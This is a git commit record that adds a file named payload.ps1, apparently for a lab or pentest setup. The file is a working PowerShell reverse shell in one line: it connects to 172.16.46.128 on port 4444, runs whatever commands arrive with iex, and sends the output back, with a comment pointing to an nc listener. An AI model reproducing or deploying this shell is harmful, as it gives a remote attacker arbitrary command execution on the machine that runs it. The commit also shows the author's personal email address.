2e0abc68cca08cff06e0253edcc09e883c215918
Martin <pmpalermo@gmail.com>
2022-10-24 09:55:43 -0700

    Create payload.ps1

---
+++ payload.ps1
@@ -0,0 +1,4 @@
+
+#ip/port nc -lp
+
+$sm=(New-Object Net.Sockets.TCPClient('172.16.46.128',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
